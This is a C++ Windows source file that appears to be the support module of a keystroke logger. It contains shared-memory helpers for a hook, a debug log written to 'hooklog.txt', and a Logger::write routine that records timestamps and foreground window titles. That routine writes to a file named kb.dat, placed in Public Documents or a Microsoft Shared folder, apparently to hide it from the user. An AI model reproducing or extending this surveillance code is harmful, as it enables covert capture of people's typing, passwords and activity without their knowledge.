#include "StdAfx.h"
#include "tool.h"
#include <stdio.h>

SharedMemory::SharedMemory(const char* name){
	strcpy_s(_name, name);
}
bool SharedMemory::create(int size){
	if(!_handle){
		_handle = CreateFileMapping((HANDLE)-1, NULL, PAGE_READWRITE, 0, size, _name);
	}
	if(_handle <= 0){
		return false;
	}
	if(!_area){
		_area = MapViewOfFile(_handle, FILE_MAP_READ|FILE_MAP_WRITE, 0, 0, 0);
	}
	if(!_area){
		return false;
	}
	return true;
}
bool SharedMemory::open(){
	if(!_handle){
		_handle = OpenFileMapping(FILE_MAP_WRITE, false, _name);
	}
	if(_handle <= 0){
		return false;
	}
	if(!_area){
		_area = MapViewOfFile(_handle, FILE_MAP_READ|FILE_MAP_WRITE, 0, 0, 0);
	}
	if(!_area){
		return false;
	}
	return true;
}
bool SharedMemory::destroy(){
	bool ret1 = true;
	bool ret2 = true;
	if(_area)
		ret1 = UnmapViewOfFile(_area);
	if(_handle)
		ret2 = CloseHandle(_handle);
	return ret1 && ret2;
}
int SharedMemory::read_int(int pos){
	int* area = (int*)((char*)_area + pos);
	return *area;
}
void SharedMemory::write_int(int val, int pos){
	int* area = (int*)((char*)_area + pos);
	*area = val;
}

void SharedMemory::write_mem(const void* mem, int from, int length){
	memcpy((char*)_area + from, mem, length);
}

void SharedMemory::read_mem(void* mem, int from, int length){
	memcpy(mem, (char*)_area + from, length);
}

void Logger::log(const char* fmt, ...){
	FILE* fp = fopen("D:/hooklog.txt", "a+");
	if(!fp){
		return;
	}
	va_list arg_ptr;
	va_start(arg_ptr, fmt);
	vfprintf(fp, fmt, arg_ptr);
	va_end(arg_ptr);

	fprintf(fp, "\n");

	fclose(fp);
}

void Logger::debug(const char* fmt, ...){
#ifdef _DEBUG
	char str[1024];
	va_list arg_ptr;
	va_start(arg_ptr, fmt);
	vsprintf(str, fmt, arg_ptr);
	va_end(arg_ptr);

	OutputDebugStringA(str);
	OutputDebugStringA("\n");
#else
	return;
#endif
}

void Logger::write(const char* fmt, ...){
	static char last_window_name[128];
	char path[MAX_PATH] = {0};
	get_save_path(path);
	FILE* fp = fopen(path, "a+");
	if(!fp){
		return;
	}
	HWND hwnd = GetForegroundWindow();
	char window_name[128];
	GetWindowText(hwnd, window_name, sizeof(window_name));
	if(strcmp(window_name, last_window_name) != 0){
		char time_str[64] = {0};
		time_t now = time(NULL);
		strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", localtime(&now)); 
		fprintf(fp, "\n%s\t%s\n", time_str, window_name);
		strncpy(last_window_name, window_name, sizeof(window_name));
	}
	va_list arg_ptr;
	va_start(arg_ptr, fmt);
	vfprintf(fp, fmt, arg_ptr);
	va_end(arg_ptr);

	fclose(fp);
}

bool get_process_name(int pid, char* name){
	HANDLE handle = OpenProcess(
		PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
		FALSE,
		pid /* This is the PID, you can find one from windows task manager */
		);
	if(handle <= 0){
		return false;
	}
	bool ret = true;
	if (!GetModuleFileNameEx(handle, 0, name, MAX_PATH)){
		ret = false;
	}
	CloseHandle(handle);
	return ret;
}

bool is_vista_or_later(){
	OSVERSIONINFO osvi;
	ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&osvi);
	return osvi.dwMajorVersion > 5;
}

bool get_save_path(char* path)
{
	if (is_vista_or_later())
		strcpy(path, "C:\\Users\\Public\\Documents\\kb.dat");
	else
		strcpy(path, "C:\\Program Files\\Common Files\\Microsoft Shared\\kb.dat");
	return true;
}

void main1(){
	SharedMemory sm("test");
	sm.create(100);
	sm.write_int(100);
	sm.destroy();

	SharedMemory sm2("test");
	sm2.open();
	int ret = sm2.read_int();
	
}